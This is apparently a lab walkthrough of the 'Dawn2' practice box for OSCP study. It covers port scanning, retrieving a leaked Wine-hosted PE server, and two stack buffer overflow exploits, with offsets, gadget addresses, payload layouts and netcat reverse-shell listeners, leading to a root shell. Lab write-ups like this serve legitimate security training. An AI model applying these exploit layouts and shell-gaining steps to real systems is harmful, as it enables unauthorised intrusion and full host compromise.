---
tags: [OSCP, Offsec, Dawn2, Linux, BufferOverflow, Wine, BinaryExploitation]
platform: OffSec PG Practice
os: Linux (Debian 10)
hostname: dawn2
difficulty: Intermediate
ip: $BoxIP
status: Complete
---

# Dawn2, Full Walkthrough

## The gist

Dawn2 exposes a static website that leaks a Windows PE server binary running under Wine. The server has a stack-based buffer overflow, so a null-terminated Linux x86 reverse shell gives an initial shell as `dawn-daemon`. A second root-owned binary is available in that user's home directory and repeats the pattern on another port, leading to root.

## Box information

| Field | Value |
|---|---|
| Platform | OffSec PG Practice |
| OS | Linux, Debian 10 |
| Hostname | dawn2 |
| Difficulty | Intermediate |
| IP | `$BoxIP` |

## Variables

```bash
boxset BoxName Dawn2
boxset BoxIP 192.168.198.12
boxset LocalIP 192.168.45.202
boxset Port 4444
boxset WebPort 80
```

## 1. Reconnaissance and service scan

A full TCP scan is important here because the two custom servers do not identify themselves reliably. The `-Pn` option skips ICMP discovery, which is useful when a lab host filters ping, while `-p-` checks every TCP port. The follow-up service scan is limited to the discovered ports so it can spend more time fingerprinting the services.

```bash
sudo nmap -Pn -n -p- --min-rate 5000 "$BoxIP" -oA nmap/allports
sudo nmap -Pn -n -sC -sV -p 80,1435,1985 "$BoxIP" -oA nmap/services
```

The result is an Apache web server and two unrecognised custom TCP services.

```text
80/tcp    open  http
1435/tcp  open  ibm-cics?
1985/tcp  open  hsrp?
Apache httpd 2.4.38 (Debian)
```


SCREENSHOT: Full TCP scan showing the three open ports.


SCREENSHOT: Focused service scan showing Apache and the two unrecognised services.

## 2. Web enumeration and binary discovery

The web service is the intended information leak. Read the page source and follow any download links before attempting to fingerprint the custom ports. Here, the page directly names the Dawn server archive, which gives us a local copy of the service for safe debugging and exploit development.

```bash
curl -s -L "http://$BoxIP/"
wget "http://$BoxIP/dawn.zip" -O loot/dawn.zip
unzip -d loot/dawn loot/dawn.zip
cat loot/dawn/README.txt
file loot/dawn/dawn.exe
```

The archive contains `README.txt` and a 32-bit Windows console executable. The README says that messages must end with a null byte and warns that the service can crash after several requests.

```text
DAWN Multi Server - Version 1.1
PE32 executable for MS Windows 6.00 (console), Intel i386
```

💡 The null byte is a protocol terminator and also a bad character for the overflow. Send it at the end of the payload, and avoid using it inside the padding, return address, NOP sled, or shellcode.

⚡ Downloading the binary immediately is faster than trying to identify a banner from the custom services. A local copy lets us reproduce the crash under Wine and inspect the executable without repeatedly touching the single-shot network service.

![[2.1http-homepage.png]]
SCREENSHOT: Homepage disclosing `/dawn.zip`.

![[3.1binary-analysis.png]]
SCREENSHOT: Archive contents, README warning, and PE32 file identification.

## 3. Reproduce the first overflow locally

Because the leaked binary is a Windows PE executable, run it under Wine and send test data to its local listening port. Incremental fuzzing establishes the approximate crash size; a cyclic pattern then identifies the exact bytes that overwrite the instruction pointer.

```bash
wine loot/dawn/dawn.exe
```

In another terminal, send progressively larger null-terminated buffers. The service responds to a short input, then resets when the buffer becomes large enough, confirming a memory-safety issue.

```python
#!/usr/bin/env python3
import socket

for size in range(100, 1000, 100):
    with socket.create_connection(("127.0.0.1", 1985), timeout=3) as sock:
        sock.sendall(b"A" * size + b"\x00")
```

Next, replace the repeated `A` bytes with a unique cyclic pattern and send it to the local copy. Wine reports the overwritten value as `316A4130`; the pattern offset calculation gives `272`.

```bash
msf-pattern_create -l 300
msf-pattern_offset -l 300 -q 316A4130
```

```text
[*] Exact match at offset 272
```

![[4.1wine-shot.png]]
SCREENSHOT: Wine debugger showing the cyclic-pattern crash.

![[5.1offset-confirmed.png]]
SCREENSHOT: Exact offset calculation returning 272.

## 4. Confirm EIP control and find a stable gadget

Before adding shellcode, prove that the offset controls EIP by replacing the next four bytes with `BBBB`. This separates an offset mistake from later shellcode or networking problems. The debugger shows `42424242`, confirming control of the instruction pointer.

```python
payload = b"A" * 272 + b"B" * 4 + b"\x00"
```

![[6.1eip-control.png]]
SCREENSHOT: EIP overwritten with `42424242`.

The first gadget search looked at system DLLs, but the reliable choice is inside the target executable itself. Check the image base and search the binary for `PUSH ESP; RET`, `CALL ESP; RET`, or `JMP ESP`. Since this executable loads without ASLR in the lab, the address reported by the binary tool is usable directly.

```bash
objdump -p loot/dawn/dawn.exe | grep ImageBase
ROPgadget --binary loot/dawn/dawn.exe | grep -E 'push esp ; ret$|call esp ; ret$|jmp esp$'
```

Use `0x34581777`, encoded little-endian as `\x77\x17\x58\x34`. A short NOP sled after the return address gives the CPU a forgiving landing area before the shellcode.

⚡ Searching the target PE first avoids rebasing a system DLL from `/proc/$PID/maps`. The executable's own gadget is stable for this service and removes an unnecessary local-Wine-versus-target-Wine mismatch.

![[7.1bad-char-test.png]]
SCREENSHOT: Bad-character testing showing null termination and the confirmed character set.

![[8.1gadget-found.png]]
SCREENSHOT: Initial gadget search and the reason to prefer a gadget in the target binary.

![[9.1local-eip-gadget-confirmed.png]]
SCREENSHOT: Local confirmation that execution reaches the selected gadget.

![[10.1gadget-in-binary.png]]
SCREENSHOT: `PUSH ESP; RET` at `0x34581777` in `dawn.exe`.

## 5. Exploit the first server

The first payload consists of the 272-byte offset, the gadget address, a NOP sled, null-free Linux x86 reverse-shell shellcode, and the required null terminator. The server runs under Wine on Linux, so the payload must be a Linux shell rather than a Windows command shell. Keep the listener ready before sending because the service is fragile and may not restart after a crash.

```bash
nc -lvnp "$Port"
python3 loot/exploit_dawn.py
```

The working exploit uses the following layout:

```python
padding = b"A" * 272
eip = struct.pack("<I", 0x34581777)
nop_sled = b"\x90" * 32
payload = padding + eip + nop_sled + shellcode + b"\x00"
```

The callback lands as `dawn-daemon`.

```text
uid=1000(dawn-daemon) gid=1000(dawn-daemon) groups=...
hostname: dawn2
```

## 6. Stabilise the shell and collect the user flag

A raw reverse shell usually lacks job control and can mishandle interactive commands. Spawn a pseudo-terminal with Python so commands, signals, and later tools behave like a normal shell. Then inspect the current home directory and read the user flag by path without copying its value into the write-up.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
id
hostname
pwd
ls -la
cat local.txt
```

![[11.1dawn-daemon-shell.png]]
SCREENSHOT: Stabilised `dawn-daemon` shell with identity, hostname, and user flag path.

## 7. Discover the root-owned server

Local enumeration is the pivot point. Look for listening sockets, then match the unfamiliar port to processes and files in the current user's home directory. The important finding is a second PE binary owned by root and listening on TCP/1435.

```bash
ss -lntp
find /home/dawn-daemon -maxdepth 1 -type f -name 'dawn*' -ls
ls -la /home/dawn-daemon
```

The output identifies `/root/dawn-BETA` as the root-run service and `/home/dawn-daemon/dawn-BETA.exe` as a readable copy for analysis. Serve the copy from the foothold and download it to Kali.

```bash
python3 -m http.server 50000 --directory /home/dawn-daemon
wget "http://$BoxIP:50000/dawn-BETA.exe" -O loot/dawn-BETA.exe
file loot/dawn-BETA.exe
```

## 8. Exploit the root server

Repeat the same development cycle against `dawn-BETA.exe`: crash it locally, locate the cyclic-pattern overwrite, confirm EIP control, and select a gadget from the target binary. The second service overwrites EIP after 13 bytes and contains `CALL ESP` at `0x52501513`.

```python
padding = b"A" * 13
eip = struct.pack("<I", 0x52501513)
nop_sled = b"\x90" * 30
payload = padding + eip + nop_sled + shellcode + b"\x00"
```

Start a separate listener and send the second-stage exploit. The payload must be sent only once against the fragile service; do not run a readiness probe first.

```bash
nc -lvnp 4445
python3 loot/exploit_beta.py
```

The callback is a root shell. Verify identity and read the proof flag by path.

```bash
id
whoami
hostname
pwd
ls -la /root
cat /root/proof.txt
```

![[12.1root-shell.png]]
SCREENSHOT: Root shell showing identity, hostname, and proof flag path.

💡 Both services are effectively single-shot during testing. A port check can consume the connection and leave the process unavailable, so start the listener first and send the exploit directly after a reset.

## RUNBOOK V2 Stages Used

- [[RUNBOOK V2/Start Here|Step 1 - Start Here]]
- [[RUNBOOK V2/Port Triage|Step 2 - Port Triage]]
- [[RUNBOOK V2/Linux - Service Scan|Step 3 - Linux Service Scan]]
- [[RUNBOOK V2/Linux - Web Enum|Step 5 - Linux Web Enum]]
- [[RUNBOOK V2/Linux - Binary Analysis|Step 7B - Linux Binary Analysis]]
- [[RUNBOOK V2/Linux - Exploit Search|Step 10 - Linux Exploit Search]]
- [[RUNBOOK V2/Linux - RCE to Shell|Step 11 - Linux RCE to Shell]]
- [[RUNBOOK V2/Linux - Shell Stabilise|Step 12 - Linux Shell Stabilise]]
- [[RUNBOOK V2/Linux - Local Enum|Step 13 - Linux Local Enum]]
- [[RUNBOOK V2/Linux - Clean Down|Step 21 - Linux Clean Down]]

## Attack Chain

1. Full TCP scan found Apache and custom services on 1435 and 1985.
2. The website disclosed `/dawn.zip`, including a PE32 server and its null-termination warning.
3. Local Wine debugging established EIP control at offset 272.
4. A gadget in `dawn.exe` redirected execution to Linux x86 shellcode and provided a `dawn-daemon` shell.
5. Local enumeration exposed the root-owned `dawn-BETA` service and a readable binary copy.
6. The second binary overwrote EIP after 13 bytes; `CALL ESP` redirected execution to the second payload.
7. The second callback ran as root and exposed the proof flag path.

## Credentials

| Account | Source | Use |
|---|---|---|
| `dawn-daemon` | First server overflow | Initial foothold and local enumeration |
| `root` | Second server overflow | Final access |

## Flags

- `local.txt` -- confirmed in `/home/dawn-daemon/local.txt`
- `proof.txt` -- confirmed in `/root/proof.txt`

## Key lessons

- A leaked PE server can be debugged locally under Wine, while the payload must match the host kernel that Wine exposes.
- Search the target binary for a stack redirection gadget before rebasing system DLL addresses.
- Treat fragile custom services as single-shot: prepare the listener, send the payload once, and reset instead of probing repeatedly.
- [ippsec.rocks](https://ippsec.rocks/) provides additional box walkthroughs for practising the same reconnaissance and exploitation habits.

## Related Boxes

- [[OSCP/BOXES/WRITE UPS/Windows/Chatterbox|Chatterbox]] -- remote buffer overflow against a custom Windows service.
- [[OSCP/BOXES/WRITE UPS/Linux/clamAV|clamAV]] -- direct service exploitation followed by root verification.
- [[OSCP/BOXES/WRITE UPS/Linux/Nibbles|Nibbles]] -- Linux foothold and local privilege-oriented enumeration.

## External Resources

- [ROPgadget](https://github.com/JonathanSalwan/ROPgadget) -- gadget discovery tool used to find `PUSH ESP; RET` inside the target PE binary.
- [HackTricks -- Stack BOF](https://book.hacktricks.xyz/binary-exploitation/stack-overflow) -- stack-based buffer overflow methodology reference.
- [RevShells](https://www.revshells.com/) -- reverse-shell payload generator; use `linux/x86` not `windows` when the target PE runs under Wine.

## Checklist

- [x] Context and post-box brief read
- [x] Full TCP reconnaissance completed
- [x] Web enumeration completed
- [x] Dawn binary downloaded and analysed
- [x] First overflow offset and EIP control confirmed
- [x] First-stage gadget and shellcode execution confirmed
- [x] `dawn-daemon` foothold obtained
- [x] User flag path confirmed
- [x] Root-owned second binary discovered and downloaded
- [x] Second overflow offset and gadget identified
- [x] Root shell obtained
- [x] Proof flag path confirmed

## Why this matters for OSCP

This box exercises the complete custom-service workflow: enumerate the download, reproduce each crash locally, confirm instruction-pointer control, then use a second service exposed by the foothold for root access.
